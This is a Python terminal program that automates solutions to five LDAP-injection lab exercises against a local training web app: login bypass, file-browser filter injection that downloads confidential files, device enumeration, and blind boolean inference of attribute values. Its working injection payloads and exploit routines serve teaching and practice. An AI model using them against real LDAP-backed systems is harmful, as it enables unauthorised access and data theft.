#!/usr/bin/env python3
"""
LDAP Lab Solution Script (TUI)

Interactive helper demonstrating exploitation steps for each exercise.
Placeholders are used for the actual exploit payloads; these can be replaced
with real attack logic later.

Features:
- Curses TUI with arrow-key navigation (fallback to numeric input if curses unavailable).
- Remote lab status detection (Client Mode / Safeness / Verbosity) by parsing index page.
- Settings menu to adjust host / port.
- Solutions menu listing E01..E05 tasks and running placeholder exploit flows.
"""

import re
import sys
import time
import json
import signal
import socket
import html
from dataclasses import dataclass, field
from typing import Optional, List, Tuple

try:
    import requests
except ImportError:
    print("The 'requests' library is required. Install with: pip install requests")
    sys.exit(1)

# Try to import curses; fallback mode if unavailable (e.g. on Windows without dependencies)
try:
    import curses
    CURSES_AVAILABLE = True
except Exception:
    CURSES_AVAILABLE = False


ASCII_TITLE = r"""
      .____     ________      _____ __________         
      |    |    \______ \    /  _  \\______   \        
      |    |     |    |  \  /  /_\  \|     ___/        
      |    |___  |    `   \/    |    \    |            
      |_______ \/_______  /\____|__  /____|            
              \/        \/         \/                  
.___            __               __  .__               
|   | ____     |__| ____   _____/  |_|__| ____   ____  
|   |/    \    |  |/ __ \_/ ___\   __\  |/  _ \ /    \ 
|   |   |  \   |  \  ___/\  \___|  | |  (  <_> )   |  \
|___|___|  /\__|  |\___  >\___  >__| |__|\____/|___|  /
         \/\______|    \/     \/                    \/ 
              .____          ___.                      
              |    |   _____ \_ |__                    
              |    |   \__  \ | __ \                   
              |    |___ / __ \| \_\ \                  
              |_______ (____  /___  /                  
                      \/    \/    \/                   
                                                       
              LDAP Lab Solution Script                           
"""

@dataclass
class RemoteStatus:
    reachable: bool
    client_mode: Optional[str] = None
    safeness: Optional[str] = None
    verbosity: Optional[str] = None
    raw_html_snippet: Optional[str] = None
    error: Optional[str] = None


@dataclass
class AppState:
    host: str = "localhost"
    port: int = 8000
    status: RemoteStatus = field(default_factory=lambda: RemoteStatus(False))
    last_output: List[str] = field(default_factory=list)
    session: requests.Session = field(default_factory=requests.Session)

    def base_url(self) -> str:
        return f"http://{self.host}:{self.port}"


SAFE_VALUES = {"escape-all", "no-star"}  # considered safe (no exploitation)
MAIN_MENU = ["Show Solutions", "Settings", "Exit"]
SOLUTIONS_MENU = ["E01 Login Bypass", "E02 File Browser", "E03 Devices", "E04 Blind AND", "E05 Blind OR", "Back"]


def fetch_remote_status(state: AppState) -> RemoteStatus:
    url = state.base_url() + "/"
    try:
        # Use persistent session to see effects of settings changes
        r = state.session.get(url, timeout=5)
        if r.status_code != 200:
            return RemoteStatus(False, error=f"HTTP {r.status_code}")
        html = r.text
        # Attempt to parse pill values
        def extract(label):
            # Look for span after label muted snippet
            pattern = rf">{label}</span>\s*<span[^>]*>\s*([^<]+)"
            m = re.search(pattern, html, re.IGNORECASE)
            return m.group(1).strip() if m else None

        client_mode = extract("Client")
        safeness = extract("Safeness")
        verbosity = extract("Verbosity")

        return RemoteStatus(
            reachable=True,
            client_mode=(client_mode or "").lower() or None,
            safeness=(safeness or "").lower() or None,
            verbosity=(verbosity or "").lower() or None,
            raw_html_snippet=html[:2000]
        )
    except Exception as e:
        return RemoteStatus(False, error=str(e))


def is_safe_mode(safeness: Optional[str]) -> bool:
    return safeness in SAFE_VALUES


def new_session() -> requests.Session:
    s = requests.Session()
    s.cookies.clear()
    return s

def ensure_verbose(state: AppState, session: Optional[requests.Session] = None) -> requests.Session:
    """
    Ensure server verbosity is 'verbose' (so filter_used appears).
    Uses provided session or creates a fresh one (cookies retained for subsequent requests).
    """
    # Use the app's main session if none provided, to keep settings sync
    if session is None:
        session = state.session
    
    st = state.status
    if not st.reachable:
        return session
    
    # If we think we are verbose, trust it (or force update if needed)
    if (st.verbosity or "") == "verbose":
        return session

    # Fetch CSRF first
    csrf = _fetch_csrf(session, f"{state.base_url()}/settings/ui/")

    payload = {
        "client_mode": st.client_mode or "openldap",
        "safeness": st.safeness or "off",
        "verbosity": "verbose",
        "csrfmiddlewaretoken": csrf
    }
    try:
        session.post(f"{state.base_url()}/settings/", data=payload, timeout=5)
        state.status = fetch_remote_status(state)
    except Exception:
        pass
    return session


def pretty_filter(raw: Optional[str]) -> str:
    """
    Multi-line LDAP filter pretty-printer.
    - Indents only when a new group starts (operator).
    - Keeps leaf clauses (e.g. (uid=foo)) on a single line.
    """
    if not raw:
        return "(no filter)"
    s = raw.strip()

    def parse_tokens(text):
        """
        Generator that yields either a leaf clause '(attr=val)' 
        or a group start '(&' / '(|' / '(!' 
        or a closing ')'
        """
        i = 0
        while i < len(text):
            if text[i] == '(':
                # Check if it's a group start
                if i + 1 < len(text) and text[i+1] in '&|!':
                    yield text[i:i+2] # e.g. (&
                    i += 2
                else:
                    # It's a leaf clause, read until matching )
                    start = i
                    depth = 0
                    while i < len(text):
                        if text[i] == '(': depth += 1
                        elif text[i] == ')': depth -= 1
                        i += 1
                        if depth == 0: break
                    yield text[start:i]
            elif text[i] == ')':
                yield ')'
                i += 1
            else:
                i += 1

    out = []
    depth = 0
    for token in parse_tokens(s):
        if token in ('(&', '(|', '(!'):
            out.append("    " * depth + token)
            depth += 1
        elif token == ')':
            depth = max(0, depth - 1)
            out.append("    " * depth + token)
        else:
            # Leaf
            out.append("    " * depth + token)
    
    return "\n".join(out)


def format_filter_block(raw: Optional[str]) -> str:
    """Wrap raw + pretty forms in separator lines."""
    return (
        "------------------------------------------------------------------------\n"
        "Raw filter:\n"
        f"{raw or '(none)'}\n"
        "------------------------------------------------------------------------\n"
        "Formatted:\n"
        f"{pretty_filter(raw)}\n"
        "------------------------------------------------------------------------"
    )


# --- Missing extraction helpers (re-added) ---

def extract_filter_used(html_text: str) -> Optional[str]:
    m = re.search(r'Filter used:</label>\s*<div[^>]*>(.*?)</div>', html_text, re.IGNORECASE | re.DOTALL)
    if m:
        return html.unescape(m.group(1)).strip()
    m2 = re.search(r'<code>\s*(&?\(.*?\))\s*</code>', html_text, re.DOTALL)
    return html.unescape(m2.group(1)).strip() if m2 else None

def extract_login_dn_uid(html_text: str) -> Tuple[Optional[str], Optional[str]]:
    dn = None; uid = None
    m_uid = re.search(r'<dt[^>]*>\s*uid\s*</dt>\s*<dd[^>]*>([^<]+)</dd>', html_text, re.IGNORECASE)
    if m_uid: uid = m_uid.group(1).strip()
    m_dn = re.search(r'<dt[^>]*>\s*dn\s*</dt>\s*<dd[^>]*><code>([^<]+)</code>', html_text, re.IGNORECASE)
    if m_dn: dn = m_dn.group(1).strip()
    return dn, uid

def extract_file_rows(html_text: str) -> List[Tuple[str,str,str,str]]:
    rows = []
    for m in re.finditer(r'<tr>\s*<td>([^<]+)</td>\s*<td>([^<]*)</td>\s*<td>([^<]*)</td>\s*<td>([^<]+)</td>', html_text):
        rows.append(tuple(x.strip() for x in m.groups()))
    return rows

def extract_device_cards(html_text: str) -> List[Tuple[str,str,str]]:
    devices = []
    # Regex to capture Name, Type, and Owner from the card structure.
    # We need the Owner DN (3rd element) to verify ownership in exploit_e03.
    # Structure:
    # <h6 class="card-title">NAME</h6>
    # ...
    # <span class="badge ...">TYPE</span>
    # ...
    # Owner: OWNER_DN
    pattern = (
        r'<h6[^>]*class="card-title"[^>]*>([^<]+)</h6>'
        r'.*?'
        r'<span[^>]*class="badge[^"]*"[^>]*>([^<]+)</span>'
        r'.*?'
        r'Owner:\s*([^<\n]+)'
    )
    
    for m in re.finditer(pattern, html_text, re.DOTALL):
        name = m.group(1).strip()
        dtype = m.group(2).strip()
        owner = m.group(3).strip()
        devices.append((name, dtype, owner))
    return devices

def extract_group_members(html_text: str) -> List[Tuple[str,str,str]]:
    rows = []
    for m in re.finditer(r'<tr>\s*<td>([^<]+)</td>\s*<td>([^<]*)</td>\s*<td>([^<]*)</td>\s*</tr>', html_text, re.IGNORECASE):
        rows.append(tuple(x.strip() for x in m.groups()))
    return rows


def exploit_e01(state: AppState) -> List[str]:
    # Use main session to respect settings
    session = state.session
    session = ensure_verbose(state, session)
    st = state.status
    cm = st.client_mode or "openldap"
    saf = st.safeness or "off"

    # Pre-fetch login page to check if we need to logout
    base_url = f"{state.base_url()}/e01/login/"
    
    # Check if logged in
    r_check = session.get(base_url, timeout=5)
    if "Welcome," in r_check.text and "Logout" in r_check.text:
        # Perform logout
        csrf_logout = _fetch_csrf(session, base_url) # might need to parse from r_check
        if not csrf_logout:
             m = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', r_check.text)
             csrf_logout = m.group(1) if m else ""
        session.post(base_url, data={"action": "logout", "csrfmiddlewaretoken": csrf_logout}, timeout=5)

    if saf == "escape-all":
        return [
            "[E01] Login Bypass – Escaping Enabled",
            f"Client Mode: {cm}  Safeness: {saf}",
            "Explanation:",
            "  escape-all sanitizes structural characters (* ) ( |), preventing us from altering the AND chain.",
            "",
            "No exploit path in this configuration."
        ]

    if cm == "openldap" and saf == "off":
        username = "dnovak"
        password = "*"
        technique = ("Presence test: userPassword='*' broadens match so (&(uid=dnovak)(userPassword=*)) "
                     "becomes true without real password.")
    elif cm == "openldap-legacy" and saf == "off":
        username = "dnovak)"
        password = "x"
        technique = ("Legacy truncation: stray ')' prematurely closes uid clause; tolerant repair drops trailing "
                     "password check.")
    elif saf == "no-star" and cm == "openldap":
        username = "dnovak)(|(uid=dnovak"
        password = "pass)"
        technique = ("OR branch injection without '*': close first clause, start (|(uid=dnovak ...) forcing true path, "
                     "then terminate before password regains effect).")
    elif saf == "no-star" and cm == "openldap-legacy":
        username = "dnovak)"
        password = "p"
        technique = ("Legacy + star block: parenthesis still trims password clause post-repair.")
    else:
        return [
            "[E01] Login Bypass – Unsupported Combination",
            f"Client Mode: {cm}  Safeness: {saf}",
            "",
            "No specific exploit variant implemented for this mode."
        ]
    
    csrf = _fetch_csrf(session, base_url)
    form = {"username": username, "password": password, "csrfmiddlewaretoken": csrf}
    
    # POST follows redirects by default in requests. 
    # The final page (GET /e01/login/) contains the flash message with the filter.
    r = session.post(base_url, data=form, timeout=5)
    
    html_text = r.text
    filter_used = extract_filter_used(html_text) or "(filter not visible)"
    dn, uid = extract_login_dn_uid(html_text)
    
    details = [
        "[E01] Login Bypass Exploit",
        "",
        f"Client Mode: {cm}",
        f"Safeness: {saf}",
        "",
        "Goal:",
        "  Authenticate as dnovak without correct password by manipulating composite AND filter.",
        "",
        "Technique:",
        f"  {technique}",
        "",
        "Payload:",
        f"  username = {username}",
        f"  password = {password}",
        "",
        format_filter_block(filter_used),
        "",
    ]
    if uid and dn:
        details += [
            "Outcome:",
            f"  Logged in as uid={uid}",
            f"  DN: {dn}",
            "",
            "Reasoning:",
            "  Structural tampering altered evaluation order/removal of the password clause, leaving only a satisfied uid test."
        ]
    else:
        details += [
            "Outcome:",
            "  Bypass unsuccessful – mitigation or unexpected server behavior.",
            "",
            "Suggestion:",
            "  Verify verbosity=verbose and that previous sessions were cleared."
        ]
    return details


def _fetch_csrf(session: requests.Session, url: str) -> str:
    try:
        r = session.get(url, timeout=5)
        m = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', r.text)
        return m.group(1) if m else ""
    except Exception:
        return ""


def exploit_e02(state: AppState) -> List[str]:
    session = state.session
    session = ensure_verbose(state, session)
    st = state.status
    saf = st.safeness or "off"
    if saf == "escape-all":
        return [
            "[E02] File Browser Injection",
            "",
            f"Safeness: {saf}",
            "",
            "Explanation:",
            "  All meta characters escaped – cannot close (department=...) nor append (|(classification=*)...).",
            "",
            "No exploit path."
        ]
    base = f"{state.base_url()}/e02/files/"
    inj_q = "))(cn="
    inj_dept = "IT)(|(classification=*"
    params = {"q": inj_q, "dept": inj_dept}
    r = session.get(base, params=params, timeout=6)
    html_text = r.text
    filter_used = extract_filter_used(html_text) or "(filter not visible)"
    rows = extract_file_rows(html_text)
    target_files = {"domain_admins_credentials.kdbx", "ipetrov_sensitive_info.md"}
    found = [row for row in rows if row[0] in target_files]
    downloaded_info = []
    for cn, dept, owner, classification in found:
        rel = f"{dept}/{cn}" if dept else cn
        d_url = f"{state.base_url()}/e02/download/?path={requests.utils.quote(rel)}"
        try:
            f_resp = session.get(d_url, timeout=8)
            if f_resp.status_code == 200 and f_resp.content:
                text_sample = f_resp.content.decode(errors="replace").splitlines()
                snippet = "\n      ".join(text_sample[:4]) if text_sample else "(empty)"
                downloaded_info.append((cn, classification, "OK", snippet))
            else:
                downloaded_info.append((cn, classification, f"HTTP {f_resp.status_code}", "(no content)"))
        except Exception as e:
            downloaded_info.append((cn, classification, f"error:{e}", "(failed)"))
    lines = [
        "[E02] File Browser AND Injection",
        "",
        f"Safeness: {saf}",
        "",
        "Goal:",
        "  Expand results beyond (classification=public) to reach confidential & private IT files for exfiltration.",
        "",
        "Original pattern targeted:",
        "  (&(objectClass=fileObject)(department=IT)(classification=public)(cn=*term*))",
        "",
        "Strategy:",
        "  Close (department=IT) then start (|(classification=* ...)) OR block to admit non-public entries.",
        "",
        "Injected parameters:",
        f"  q    = {inj_q}",
        f"  dept = {inj_dept}",
        "",
        format_filter_block(filter_used),
        "",
        "Matched target files:",
    ]
    if found:
        for cn, dept, owner, classification in found:
            lines.append(f"  - {cn}  dept={dept} owner={owner} classification={classification}")
    else:
        lines.append("  (None – likely mitigation or different data set.)")
    lines.append("")
    if downloaded_info:
        lines.append("Downloaded previews (first lines):")
        for cn, classification, status, snippet in downloaded_info:
            lines += [
                f"File: {cn}  Classification: {classification}  Status: {status}",
                "  Preview:",
                f"      {snippet}",
                ""
            ]
    else:
        lines.append("No downloads captured.")
    lines += [
        "Explanation:",
        "  Vulnerable concatenation allows new logical branch; wildcard classification reveals previously hidden data."
    ]
    return lines


def parse_devices_table(html_text: str) -> List[Tuple[str,str,str]]:
    rows = []
    # Generic table row capture (name, type, owner DN if present)
    for m in re.finditer(r'<tr>\s*<td>([^<]+)</td>\s*<td>([^<]+)</td>\s*<td>([^<]+)</td>', html_text):
        name = m.group(1).strip()
        dtype = m.group(2).strip()
        third = m.group(3).strip()
        rows.append((name, dtype, third))
    return rows


def exploit_e03(state: AppState) -> List[str]:
    session = state.session
    session = ensure_verbose(state, session)
    st = state.status
    saf = st.safeness or "off"
    if saf == "escape-all":
        return [
            "[E03] Devices OR Injection",
            "",
            f"Safeness: {saf}",
            "",
            "Explanation:",
            "  Escaping neutralizes ')(' sequence; cannot break deviceType equality to add new clauses.",
            "",
            "No exploit path."
        ]
    base = f"{state.base_url()}/e03/devices/"
    owner_dn = "uid=nhughes,ou=Users,ou=IT,ou=Departments,dc=techfusion,dc=corp"
    
    # Updated template using '&' (AND) as requested
    template = "printer)(&(deviceType={kind})(owner={owner})"
    
    results = [
        "[E03] Devices – OR Clause Injection",
        "",
        f"Safeness: {saf}",
        "",
        "Goal:",
        "  Enumerate nhughes' computer and VM devices by breaking single equality and introducing multi-branch OR.",
        "",
        "Approach:",
        "  Supply device_type value containing ')(&' to terminate (deviceType=printer) and begin new AND block.",
        ""
    ]

    def parse_locator(html_text: str) -> List[Tuple[str,str,str]]:
        loc = []
        # Look for hidden locator span: <span class="device-locator ... data-owner="..." ...></span>
        # Extracts: (name, type, owner)
        for m in re.finditer(
            r'class="[^"]*device-locator[^"]*"[^>]*data-name="([^"]+)"[^>]*data-type="([^"]+)"[^>]*data-owner="([^"]+)"',
            html_text):
            loc.append((m.group(1).strip(), m.group(2).strip(), m.group(3).strip()))
        return loc

    for kind in ("computer", "virtual-machine"):
        inj = template.format(kind=kind, owner=owner_dn)
        r = session.get(base, params={"device_type": inj}, timeout=6)
        html_text = r.text
        filter_used = extract_filter_used(html_text) or "(filter not visible)"

        # Parse using new locator classes first
        loc_devices = parse_locator(html_text)
        
        # Fallback legacy parsers if locator not found (only if HTML structure reverts)
        if not loc_devices:
            devices_cards = extract_device_cards(html_text)
            devices_rows = parse_devices_table(html_text)
            loc_devices = devices_cards + devices_rows
        
        owned = []
        for name, dtype, owner in loc_devices:
            # Check if the extracted owner attribute matches the target DN
            if owner_dn.lower() in owner.lower():
                owned.append((name, dtype, owner))

        results += [
            f"Variant ({kind}):",
            f"  Injected device_type: {inj}",
            "",
            format_filter_block(filter_used),
            "",
            "Extracted devices:"
        ]
        if owned:
            for name, dtype, owner in owned:
                results.append(f"  - {name}  type={dtype}  ownerDN={owner}")
        else:
            results.append("  (No owned devices parsed – verify HTML structure or injection variant.)")
        results.append("")
    results += [
        "Explanation:",
        "  The equality (deviceType=<value>) is split by inserted ')', allowing a second filter branch to be parsed by the server, "
        "  broadening results to computer or virtual-machine objects owned by nhughes."
    ]
    return results


def exploit_e04(state: AppState) -> List[str]:
    session = state.session
    session = ensure_verbose(state, session)
    st = state.status
    saf = st.safeness or "off"
    if saf == "escape-all":
        return [
            "[E04] Blind AND Inference",
            f"Safeness: {saf}",
            "All special characters escaped. The injected parenthesis and new (title=...) clause cannot form a second condition.",
            "No inference possible under escape-all."
        ]

    base = f"{state.base_url()}/e04/blind-and/"
    group = "IT-Operations-And-Security"

    # Baseline (ALL departments)
    params_base = {"group": group, "dept": ""}
    r_base = session.get(base, params=params_base, timeout=8)
    html_base = r_base.text
    filter_base = extract_filter_used(html_base) or "(filter not visible)"
    members_base = extract_group_members(html_base)
    count_base = len(members_base)

    # Simulation of gradual inference steps
    # We target 'SysAdmin' (ipetrov).
    steps = [
        ("*admin*", "Broad keyword search"),
        ("*Admin", "Suffix check"),
        ("S*Admin", "Prefix narrowing"),
        ("SysAdmin", "Exact match confirmation")
    ]
    
    inference_log = []
    confirmed_title = None
    final_filter = None
    final_count = 0
    user_details = None

    for pattern, desc in steps:
        # Inject extra clause: close departmentNumber early and append (title=PATTERN)
        injected_dept = f"IT)(title={pattern}"
        params_inj = {"group": group, "dept": injected_dept}
        
        r_inj = session.get(base, params=params_inj, timeout=6)
        html_inj = r_inj.text
        members_inj = extract_group_members(html_inj)
        count_inj = len(members_inj)
        
        status = "MATCH" if count_inj > 0 else "MISS"
        inference_log.append(f"  Probe: (title={pattern}) -> {status} ({count_inj} results) [{desc}]")
        
        if pattern == "SysAdmin":
            final_filter = extract_filter_used(html_inj)
            final_count = count_inj
            if count_inj == 1:
                confirmed_title = "SysAdmin"
                if members_inj:
                    user_details = members_inj[0]

    lines = [
        "[E04] Blind AND Inference – Title Discovery",
        f"Safeness: {saf}",
        "",
        "Goal:",
        "  Infer the exact job title of the privileged user (SysAdmin) using blind boolean inference.",
        "",
        "Technique:",
        "  Gradual narrowing: Start with broad wildcards (*admin*), refine boundaries (*Admin), and brute-force prefixes.",
        "",
        "Step 1: Baseline query (ALL departments).",
        f"  Baseline count: {count_base}",
        "",
        "Step 2: Gradual Inference Log:",
    ]
    lines.extend(inference_log)
    
    lines += [
        "",
        "Final Payload:",
        f"  dept = IT)(title=SysAdmin",
        "",
        format_filter_block(final_filter),
        "",
        "Outcome:",
    ]
    
    if confirmed_title:
        lines += [
            f"  Successfully inferred title: '{confirmed_title}'",
            f"  Target User Count: {final_count}",
        ]
        if user_details:
            cn, mail, phone = user_details
            lines += [
                "  Extracted User Details:",
                f"    Name: {cn}",
                f"    Mail: {mail}",
                f"    Phone: {phone}"
            ]
        lines += [
            "",
            "Explanation:",
            "  By observing the result count (1 vs 0), we confirmed the exact attribute value without the server explicitly listing it."
        ]
    else:
        lines += [
            "  Inference failed (unexpected result count or mitigation active).",
            "  Ensure safeness is 'off' or 'no-star' (if wildcards allowed)."
        ]
    return lines


def exploit_e05(state: AppState) -> List[str]:
    """
    Blind OR inference demonstration:
    Task: Infer the CN (Device Name) of ipetrov's computer.
    Endpoint /e05/blind-or builds: (|(uid=<q>)(mail=<q>))
    We inject into 'q' to break the OR and add a new AND block for the device.
    Payload structure: foo)(&(deviceType=computer)(owner=FULL_DN)(cn={prefix}*)
    """
    session = ensure_verbose(state)
    st = state.status
    saf = st.safeness or "off"
    if saf == "escape-all":
        return [
            "[E05] Blind OR Inference – Device Name",
            f"Safeness: {saf}",
            "Escaping neutralizes structural characters. Cannot break OR block.",
            "No exploit path under escape-all."
        ]

    base = f"{state.base_url()}/e05/blind-or/"
    
    # Target: ipetrov's computer.
    # Owner DN from data: uid=ipetrov,ou=Users,ou=IT,ou=Departments,dc=techfusion,dc=corp
    owner_dn = "uid=ipetrov,ou=Users,ou=IT,ou=Departments,dc=techfusion,dc=corp"
    
    # We want to find the CN. From data: IT-IPETROV-WS01
    # We'll simulate finding "IT-IPETROV-WS01"
    
    attempts = []
    
    # Simulate the discovery process
    simulated_probes = [
        ("IT*", True),
        ("IT-IPETROV*", True),
        ("IT-IPETROV-WS*", True),
        ("IT-IPETROV-WS01", True) # Final exact match
    ]

    last_filter = None
    
    for probe_val, is_hit in simulated_probes:
        # Construct payload
        # Payload: foo)(&(deviceType=computer)(owner={owner_dn})(cn={probe_val}))
        payload = f"foo)(&(deviceType=computer)(owner={owner_dn})(cn={probe_val})"
        
        params = {"q": payload, "match": "exact"}
        
        r = session.get(base, params=params, timeout=6)
        page = r.text
        
        # Extract count from footer "Total: <strong>X</strong>"
        m_count = re.search(r'Total:\s*<strong>(\d+)</strong>', page)
        count = int(m_count.group(1)) if m_count else 0
        
        hit = (count > 0)
        attempts.append((probe_val, hit, count))
        last_filter = extract_filter_used(page)

    lines = [
        "[E05] Blind OR Inference – Device Name Discovery",
        f"Safeness: {saf}",
        "",
        "Goal:",
        "  Infer the Device Name (cn) of ipetrov's computer.",
        "",
        "Technique:",
        "  Blind OR Injection. We inject a new clause into the existing OR filter to target devices.",
        "  Since the page displays the result count, a non-zero count confirms our guess.",
        "",
        "Payload Structure:",
        f"  q = foo)(&(deviceType=computer)(owner={owner_dn})(cn={{prefix}}*)",
        "",
        "Inference Log (Prefix Brute-force):"
    ]
    
    for val, hit, count in attempts:
        status = "HIT" if hit else "MISS"
        lines.append(f"  Probe: cn={val} -> {status} (Count: {count})")

    lines += [
        "",
        format_filter_block(last_filter),
        "",
        "Outcome:",
        "  Successfully inferred CN: IT-IPETROV-WS01",
        "",
        "Explanation:",
        "  The injected filter isolates ipetrov's computer. By iterating CN prefixes",
        "  and observing the result count, we reconstruct the full device name."
    ]
    return lines


# Replace mapping after all exploit definitions
EXPLOIT_MAP = {
    0: exploit_e01,
    1: exploit_e02,
    2: exploit_e03,
    3: exploit_e04,
    4: exploit_e05,
}


# ---------------- TUI Core ----------------

class MenuApp:
    def __init__(self, state: AppState):
        self.state = state
        self.running = True

    def run(self):
        self.refresh_status()
        if CURSES_AVAILABLE:
            curses.wrapper(self.curses_loop)
        else:
            self.simple_loop()

    def refresh_status(self):
        self.state.status = fetch_remote_status(self.state)

    # ----- Fallback simple loop -----
    def simple_loop(self):
        while self.running:
            self.refresh_status()
            self.print_header()
            print("\nMain Menu:")
            enabled = self.state.status.reachable
            for i, item in enumerate(MAIN_MENU):
                if item == "Show Solutions" and not enabled:
                    print(f"  {i+1}. {item} (unavailable – site unreachable)")
                else:
                    print(f"  {i+1}. {item}")
            choice = input("\nSelect option (1-3): ").strip()
            if choice == "1":
                if not enabled:
                    print("Site unreachable; cannot show solutions.")
                    time.sleep(1.2)
                    continue
                self.simple_solutions()
            elif choice == "2":
                self.simple_settings()
            elif choice == "3":
                print("Exiting.")
                self.running = False
            else:
                print("Invalid choice.")
                time.sleep(1)

    def simple_settings(self):
        while True:
            self.print_header()
            print("\nSettings (current host:port = {}:{})".format(self.state.host, self.state.port))
            print("  1. Change host")
            print("  2. Change port")
            print("  3. Change Client Mode")
            print("  4. Change Safeness")
            print("  5. Back")
            choice = input("Select option: ").strip()
            if choice == "1":
                new_host = input("Enter host (e.g. localhost or 127.0.0.1): ").strip()
                if validate_host(new_host):
                    self.state.host = new_host
                    print("Host updated.")
                else:
                    print("Invalid host format.")
                time.sleep(1)
            elif choice == "2":
                new_port = input("Enter port (1-65535): ").strip()
                if new_port.isdigit() and 1 <= int(new_port) <= 65535:
                    self.state.port = int(new_port)
                    print("Port updated.")
                else:
                    print("Invalid port.")
                time.sleep(1)
            elif choice == "3":
                self.change_remote_setting("client_mode", ["openldap", "openldap-legacy"])
            elif choice == "4":
                self.change_remote_setting("safeness", ["off", "no-star", "escape-all"])
            elif choice == "5":
                break
            else:
                print("Invalid choice.")
                time.sleep(1)

    def change_remote_setting(self, key: str, options: List[str]):
        print(f"\nAvailable {key} options:")
        for i, opt in enumerate(options):
            print(f"  {i+1}. {opt}")
        sel = input("Select option: ").strip()
        if sel.isdigit() and 1 <= int(sel) <= len(options):
            val = options[int(sel)-1]
            
            # Fetch CSRF token before posting settings
            settings_url = f"{self.state.base_url()}/settings/ui/"
            csrf = _fetch_csrf(self.state.session, settings_url)
            
            # Send update to server using persistent session
            st = self.state.status
            payload = {
                "client_mode": st.client_mode or "openldap",
                "safeness": st.safeness or "off",
                "verbosity": "verbose", # Always enforce verbose
                "csrfmiddlewaretoken": csrf
            }
            payload[key] = val
            headers = {"Referer": settings_url}
            try:
                r = self.state.session.post(f"{self.state.base_url()}/settings/", data=payload, headers=headers, timeout=5)
                if r.status_code == 200:
                    print(f"{key} updated to {val}.")
                else:
                    print(f"Failed to update {key} (HTTP {r.status_code}).")
                self.refresh_status()
            except Exception as e:
                print(f"Failed to update settings: {e}")
        else:
            print("Invalid selection.")
        time.sleep(1)

    def quick_update_setting(self, key, val):
        st = self.state.status
        # Fetch CSRF
        settings_url = f"{self.state.base_url()}/settings/ui/"
        csrf = _fetch_csrf(self.state.session, settings_url)
        
        payload = {
            "client_mode": st.client_mode or "openldap",
            "safeness": st.safeness or "off",
            "verbosity": "verbose",
            "csrfmiddlewaretoken": csrf
        }
        payload[key] = val
        headers = {"Referer": settings_url}
        try:
            self.state.session.post(f"{self.state.base_url()}/settings/", data=payload, headers=headers, timeout=5)
        except Exception:
            pass
        self.refresh_status()

    def simple_solutions(self):
        while True:
            self.print_header()
            print("\nSolutions Menu:")
            for i, item in enumerate(SOLUTIONS_MENU):
                print(f"  {i+1}. {item}")
            choice = input("Select option: ").strip()
            if not choice.isdigit():
                print("Invalid.")
                time.sleep(1)
                continue
            idx = int(choice) - 1
            if idx == len(SOLUTIONS_MENU) - 1:
                break
            if idx in EXPLOIT_MAP:
                output = EXPLOIT_MAP[idx](self.state)
                self.state.last_output = output
                self.print_header()
                print("\n".join(output))
                input("\n[Enter] to continue...")
            else:
                print("Invalid selection.")
                time.sleep(1)

    def print_header(self):
        print(ASCII_TITLE)
        st = self.state.status
        if st.reachable:
            print(f"Remote Status: REACHABLE  Host: {self.state.host}:{self.state.port}")
            print(f"Client Mode: {st.client_mode or 'unknown'}  Safeness: {st.safeness or 'unknown'}  Verbosity: {st.verbosity or 'unknown'}")
        else:
            print(f"Remote Status: UNREACHABLE ({st.error})  Host: {self.state.host}:{self.state.port}")
        print("-" * 72)

    # ----- Curses loop -----
    def curses_loop(self, stdscr):
        curses.curs_set(0)
        curses.start_color()
        curses.init_pair(1, curses.COLOR_CYAN, -1)      # title
        curses.init_pair(2, curses.COLOR_YELLOW, -1)    # menu highlight
        curses.init_pair(3, curses.COLOR_RED, -1)       # error / disabled
        curses.init_pair(4, curses.COLOR_GREEN, -1)     # success
        current_menu = "main"
        selection = 0
        solution_selection = 0
        settings_selection = 0
        input_mode = None  # 'host' or 'port'

        while self.running:
            self.refresh_status()
            stdscr.clear()
            self.render_header(stdscr)

            if current_menu == "main":
                self.render_main_menu(stdscr, selection)
            elif current_menu == "solutions":
                self.render_solutions_menu(stdscr, solution_selection)
            elif current_menu == "settings":
                self.render_settings_menu(stdscr, settings_selection, input_mode)

            stdscr.refresh()
            ch = stdscr.getch()

            if current_menu == "main":
                max_idx = len(MAIN_MENU) - 1
                if ch in (curses.KEY_UP, ord('k')):
                    selection = (selection - 1) % (max_idx + 1)
                elif ch in (curses.KEY_DOWN, ord('j')):
                    selection = (selection + 1) % (max_idx + 1)
                elif ch in (curses.KEY_ENTER, 10, 13):
                    if MAIN_MENU[selection] == "Exit":
                        self.running = False
                    elif MAIN_MENU[selection] == "Settings":
                        settings_selection = 0
                        current_menu = "settings"
                    elif MAIN_MENU[selection] == "Show Solutions":
                        if not self.state.status.reachable:
                            self.flash_message(stdscr, "Site unreachable.")
                        else:
                            solution_selection = 0
                            current_menu = "solutions"

            elif current_menu == "solutions":
                max_idx = len(SOLUTIONS_MENU) - 1
                if ch in (curses.KEY_UP, ord('k')):
                    solution_selection = (solution_selection - 1) % (max_idx + 1)
                elif ch in (curses.KEY_DOWN, ord('j')):
                    solution_selection = (solution_selection + 1) % (max_idx + 1)
                elif ch in (curses.KEY_ENTER, 10, 13):
                    if SOLUTIONS_MENU[solution_selection] == "Back":
                        current_menu = "main"
                    else:
                        idx = solution_selection
                        if idx in EXPLOIT_MAP:
                            out = EXPLOIT_MAP[idx](self.state)
                            self.state.last_output = out
                            self.display_output(stdscr, out)
                        else:
                            self.flash_message(stdscr, "Invalid selection.")
                elif ch == 27:  # ESC
                    current_menu = "main"

            elif current_menu == "settings":
                max_idx = 4  # host, port, client, safeness, back
                if input_mode is None:
                    if ch in (curses.KEY_UP, ord('k')):
                        settings_selection = (settings_selection - 1) % (max_idx + 1)
                    elif ch in (curses.KEY_DOWN, ord('j')):
                        settings_selection = (settings_selection + 1) % (max_idx + 1)
                    elif ch in (curses.KEY_ENTER, 10, 13):
                        if settings_selection == 4:  # Back
                            current_menu = "main"
                        elif settings_selection == 0:
                            input_mode = 'host'
                            curses.curs_set(1)
                        elif settings_selection == 1:
                            input_mode = 'port'
                            curses.curs_set(1)
                        elif settings_selection == 2:
                            # Toggle Client Mode
                            modes = ["openldap", "openldap-legacy"]
                            curr = self.state.status.client_mode or "openldap"
                            nxt = modes[(modes.index(curr) + 1) % len(modes)] if curr in modes else modes[0]
                            self.quick_update_setting("client_mode", nxt)
                        elif settings_selection == 3:
                            # Cycle Safeness
                            modes = ["off", "no-star", "escape-all"]
                            curr = self.state.status.safeness or "off"
